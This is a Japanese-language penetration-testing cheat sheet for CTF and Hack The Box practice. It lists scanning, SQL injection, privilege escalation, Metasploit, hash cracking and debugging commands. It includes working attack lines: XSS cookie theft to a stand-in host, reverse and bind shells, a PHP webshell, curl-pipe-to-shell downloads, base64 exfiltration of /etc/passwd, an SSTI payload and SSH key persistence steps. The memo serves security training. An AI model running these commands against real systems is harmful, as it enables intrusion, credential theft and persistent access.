# Memo
### ctfとかhtbとか  

#### nmap

全ポートのスキャン(時間はかかる)  
```sudo nmap -sS -Pn -p- IP```  

-sV -Aでバージョン情報とかを得るようになる(指定しているポートは確認したほうがよさそうなポート)  
```nmap -sV -n -Pn -A -p 21-25,35,43,53,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,5555,7777,8008,8065,8080,8443,8888 IP```  

-g 53で送信元ポートを53(DNS)に偽装する  

```nmap -sV -n -A -g 53 -p 21-25,35,43,53,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,5555,7777,8008,8065,8080,8443,8888 IP```  


<br>  

#### XSS  

下記を入力して表記が崩れたらXSSいけるかも  
> 参考 https://jpcertcc.github.io/OWASPdocuments/CheatSheets/XSSFilterEvasion.html#XSS_Locator 

```'';!--"<XSS>=&{()}```  

下記はCookieをrequestbin.example.com(例なので存在しない)に送信するスクリプト  
下記のrequestbin.example.comに対応するものは例えばhttps://requestbin.com/   

```<script>fetch('https://requestbin.example.com?data=${document.cookie}')</script>```  

こっちも有り  

```<script src="data:,document.location='https://requestbin.example.com?data='+document.cookie"></script>```  


<br>  

#### dirsearchとか  
dirsearch  

```dirsearch -u http://127.0.0.1/ -e html,txt,php```  

gobuster  

```gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt -t 15```  



#### SQL  
Postでsqlmap  

```sqlmap -u http://127.0.0.1/login.php --data "username=1&password=2"```  





#### webshell   
Kaliにはwebshellも用意されている  

```/usr/share/webshells/php/simple-backdoor.php```


<br>  

#### 権限昇格関連  
まずはNOPASSWORDで何が出来るか調べる．  

```sudo -l```  

実行中のプロセスを表示  

```ps aux```  

CVE-2019-14287  

```sudo -u#-1 whoami```    

 attacker:~/enumフォルダには  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
https://github.com/diego-treitos/linux-smart-enumeration  
https://github.com/rebootuser/LinEnum  
などのEnumツールが入ってると仮定  
上の例ではlinpeas.shを指定している  

```attacker:~/enum$ sudo python -m SimpleHTTPServer 80```  
```victim$ curl attackerIP/linpeas.sh | sh```  

  
###### 権限昇格Memo  
```パスワードとかがあったら使い回せないか調べる．```  
```実行可能なファイル（普段はなさそうなもの）を探す．```  
```設定ファイル(config)```  
```バックアップ(.old, .bak)```  


<br>  

#### SQL  
##### MySQL  
mysqlにrootユーザで接続  

```mysql -u root -p```  

データベース一覧取得  

```SHOW DATABASES;```  

databasenameで指定したデータベースを選択  

```use databasename```  

テーブル一覧取得  

```SHOW TABLES;```  

tabelenameで指定したテーブルの内容を取得  

```SELECT * FROM `tabelename`;```  

一応commandは実行できる  

```\! command```  


<br>  

#### Hash  
-m 3200はhashのタイプをbcryptに指定する  
上は一つの例 実際に上のルールをrockyou.txtに指定するととても時間がかかる．

```hashcat -m 3200 -a 0 'HashHere' -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt```  


<br>  

#### Metasploit  
handler起動  
上の例はx64 Linux でReverse TCPを指定  
[IP]に指定するのは攻撃者側のIP  
[port]に指定するのは攻撃者側のport(規定値は4444)  

```use exploit/multi/handler```  
```set payload linux/x64/shell_reverse_tcp ```  
```set lhost [IP]```  
```set lport [port]```  
```run```  

sessionをバックグランドに回す  

```meterpreter> background```  

sessionが確立された後に，そのセッションを指定してrunすると使えそうな脆弱性を洗い出してくれる．  

```use multi/recon/local_exploit_suggester```  



#### msfvenom  
payloadの確認  

```msfvenom -l payload```  

formatの確認  

```msfvenom -l format```  

msfvenom使用例  
-pでpayload指定  
-fでformat指定  
payloadにmeterpreterが入っているもをの指定した場合は，msfconsoleのexploit/multi/handlerで待ち受けする(payloadはmsfvenomで使用したものと同じものを指定)  

```/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe```  



#### PHP object injection  
```O:6:"OBJECT":2:{s:4:"var1";s:5:"test1";s:4:"var2";s:5:"test2";}```  
> 上記の例解説(よく理解していないので細かいところは間違っているかも)  
> O:6:"OBJECT" のOBJECTにはインスタンスを作成したいクラス名を指定．一つ前の数字はクラス名の文字列  
> :2: の2は，値を入れる変数の個数．上記の例ではvar1とvar2の2つ  
> {} 内で変数名と値を交互に入れる．(使用できる変数名は，クラスの__destruct()を見る)  
> s:4:"var1"; のvar1は変数名. 4は変数名の文字数  
> s:5:"test1"; のtest1は値. 5は値の文字列




#### backdoor  
被攻撃サーバにbackdoorを作成  

```nc -l -n 7777 -e /usr/bin/bash```  

backdoorに接続  

```nc ip 7777```  

backdoor example  

```nc -lnvp [port]```  
```bash -i >& /dev/tcp/[ip]/[port] 0>&1```  

sshの公開鍵で接続できるようにする  

```kali$ ssh-keygen ./id_rsa```  
```kali$ cat id_rsa.pub```  
```victim$ vi ~/.ssh/authorized_keys```  
```id_rsa.pubの中身をそのままauthorized_keysにコピー```  
```kali$ ssh -i ./id_rsa victim@ip```  

reverse shell tty  

```attacker$ stty raw -echo && socat file:$(tty),raw,unlink-close=0 tcp-listen:5555```  
```victim$ python -c 'import pty; pty.spawn("/bin/bash")' 9<>/dev/tcp/10.10.14.115/5555 <&9 >&9 2>&9 # pythonを利用する場合```  
```victim$ script -c 'bash -i' /dev/null 9<>/dev/tcp/10.10.14.115/5555 <&9 >&9 2>&9 # scriptコマンドを利用する場合```  

一番シンプル？なWebshell  
クエリ文字列として以下のように指定  
?cmd=ls+-la  

```<?php system($_REQUEST['cmd']); ?>```  



#### RSA  
private_keyには秘密鍵のファイルを指定  
plain.txtには暗号化したいファイルを指定  

```openssl rsautl -encrypt -inkey private_key -in plain.txt -out encrypted```  

公開鍵で暗号化する方法  

```openssl rsautl -encrypt -pubin -inkey public_key -in plain.txt -out encrypted```  

秘密鍵で復号する方法  

```openssl rsautl -decrypt -inkey private_key -in encrypted -out decrypted.txt```  

#### OllyDbg  
ショートカット一覧  

```
F2：ブレークポイント設定/解除
F7：詳細ステップ実行(ステップイン：関数内部まで入り実行)
F8：ステップ実行(ステップオーバー：関数呼び出しを1命令として実行)
F9：デバッギー実行
Ctrl+F2:再スタート
F12：デバッギー実行一時停止
Ctrl+F9：リターンまで実行
Alt+F9：ユーザーコードまで実行(システムDLL内から抜ける際等に使用)
Space：アセンブル
Ctrl+E：バイナリデータの編集
Ctrl+G：アドレスを指定して移動
ESC：詳細自動ステップ実行の停止
```  


#### gdb-peda  
gdb-peda起動  

```gdb```  

pedaを入れているのにgdbが起動してしまう場合は以下を実行  

```echo "source ~/peda/peda.py" >> ~/.gdbinit```  

起動中のプロセスにアタッチPIDはps auxとかで調べる．  

```gdb-peda$ attach PID```  

実行  

```gdb-peda$ r```  

ブレークポイント設定  
上はmain関数に設定  
下は0xffffffffアドレスに設定  

```
gdb-peda$ b main
gdb-peda$ b *0xffffffff
```  

ステップ実行  

```gdb-peda$ ni```  

次のブレークポイントまで実行  

```gdb-peda$ c```  

格納されている値を見る  

```gdb-peda$ x/12xw $ebp```  

値の書き換え  

```gdb-peda$ set $eip=0xffffffff```  

BOFとかでアドレスの位置を知りやすくするための入力値を生成  

```gdb-peda$ pattern_create```  

AAFAまでのオフセットを取得  

```gdb-peda$ patto AAFA```  

16進数の値計算が出来る  

```gdb-peda$ p 0x5a-0x4```  




#### socat  
./vulnにlocalhost:4445でアクセス可能  

```socat TCP-LISTEN:4445,fork EXEC:"./vuln"```  



#### Windows でcmdかpowershellから外部のファイルをダウンロードさせる方法  
```powershell```  
```$client = new-object System.Net.WebClient```  
```$client.DownloadFile("http://example.com/content/","C:\Users\Administrator\Desktop\file.txt")```  
> powershellコマンドは初めからpowershellが取れている場合は必要ない．
> example.com/contentの部分を取得したいコンテンツに書き換え，C:\Users\Administrator\Desktop\file.txtの部分をダウンロードファイルの配置先に置き換える．  
> ※wget やcurlが使えるならそっち使った方が早い  


#### GitLab  
```git cat-file -p [40文字]```  
> 参考 https://www.yoheim.net/blog.php?q=20140210  


#### SSH(Metasploit)  
認証試行  

```use auxiliary/scanner/ssh/ssh_login```  

ssh login and spawn meterpreter  

```use exploit/multi/ssh/sshexec```  

#### WPScan  

基本のwpscan  
api tokenが必要(https://wpscan.com/register) <- free版で良い   
環境変数(WPSCANTOKEN)にapi-tokenを入れてある  

```wpscan --url http://target.example.com -v --api-token $WPSCANTOKEN```  



#### Shellが安定しないとき  
ちょっと使いやすくなるかも  

```script -c "/bin/bash -i" /dev/null```  
```python3 -c "import pty;pty.spawn('/bin/bash')"```  
```/bin/bash -i```  



#### Bash系?  
\nを改行に変換  

```echo "aa\nbb\ncc" | sed 's/\\n/\```  
```/g'```  



#### pwn  
実行ファイル中のシンボルを表示  

```nm a.out```  


#### Windows cmd  
カレントディレクトリからサブディレクトリを辿ってroot.txtを検索  

```dir /s root.txt```  



#### hydra  
memo Uuser=^USER^&PWD=^PASS^  

```# hydra -L [ユーザID辞書ファイル] -P [パスワード辞書ファイル] [対象サーバ名/対象サーバIPアドレス] http-post-form 'パス:クエリ:ログイン失敗文字列'```  


<br>  

#### レポート  
ターミナルの出力(ログ)をfilenameに記録できる  

```script filename```

scriptコマンドで出力したログを表示  

```less -r logfile```  

標準出力なし，バックグラウンドでcherrytree起動  

```cherrytree > /dev/null 2>&1 &```  



#### コマンドの実行結果を転送  
攻撃側の8000番ポートでhttpが待ち受けていることを仮定  
使用時にはlocalhostを攻撃側のipにする  

```curl localhost:8000/?$(cat /etc/passwd | base64 -w 0)```  


#### Google Dork  
```cache:```  
```allinurl:```  
```inurl:```  
```allintitle:```  
```intitle:```  
```inanchor:```  
```allinanchor:```  
```link:```  
```related:```  
```info:```  
```location:```  
```filetype:```  
```site:```


#### SMB  
```nmblookup -A [IP]```  
```nbtscan [IP]```  

smbで公開されているフォルダへ接続
```smbclient //<IP>/"Shares"```

#### winrm  
パスワードを用いてwinrm  
```evil-winrm -i <IP> -p 'password' -u Administrator -S```  
証明書ファイルを用いてwinrm  
```evil-winrm -i <IP> -k windows.key -c windows.cert -S ```  

#### pfx file  
pfxファイル(証明書とかが入っている? )からcertファイルとかkeyファイルを取り出す。 

```openssl pkcs12 -in windows.pfx -clcerts -nokeys -out windows.cert```  

```openssl pkcs12 -in windows.pfx -nocerts -nodes -out windows.key```

#### SSTI  
sstiでコマンド実行  
```{{ get_flashed_messages.__globals__.__builtins__.___import__("os").popen("cat /etc/passwd").read() }}```  

#### PowerShell  
Powershellでの実行履歴を取得  
```Get-Content C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt```  

実行ユーザがLDAP_Readersグループに属している場合、ローカルのパスワードが分かることがある。 
```$Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime```  
```$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime```  


#### Capabilities  
rootに昇格可能な物を見つける  

```getcap -r / 2>/dev/null```  

pythonでuidを0に設定してシェルを起動する例  

```./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'```  



#### Subdmain  
サブドメインを見つける．  

```wfuzz -c -H "Host: FUZZ.<target domain>" -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<targetIP>```  

一つ上のコマンドでサブドメインが見つからなかった時のlengthを見つけた時にそのlengthを数値で指定して実行する  

```wfuzz -c -H "Host: FUZZ.<target domain>" -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<target ip> --hh <length>```  


#### hash analyze  
ハッシュの種類を特定する．$とかはエスケープすること  

```hashid <hash>```  


#### encrypted id_rsa  
johnでパスクラできる形式に変換  

```ssh2john id_rsa >> id_rsa.john```  

johnでパスクラ  

```john id_rsa.john --wordlist=rockyou.txt```  

#### steghide  
画像からファイルを抽出  

```steghide extract -sf <image>```  


#### ssh の証明書をtarget内で作成  
targetのシェルを取ったら上記を実行  
これで鍵のペアが作成される  

```cd ~/```  
```mkdir .ssh```  
```ssh-keygen -q -t rsa -N ‘’ -C ‘pam’```  
```cp .ssh/id_rsa.pub .ssh/authorized_keys```  
```chmod 600 .ssh/authorized_keys```  

秘密鍵をbase64にするとローカルへのコピーが楽になる  

```cat .ssh/id_rsa | base64```  

上記をローカルで実行するとターゲット上で作成した鍵でssh接続できるようになる。  

```echo -n '<base64 id_rsa>' | base64 -d > target_id_rsa```  
```chmod 600 target_id_rsa```  
```ssh -i target_id_rsa <user>@<target domain>```  



<br>  

#### スタック時のアドバイス  
・キーワードになりそうなもの(些細なものでも)を一旦メモか何かにまとめる．  
・crontab -l  
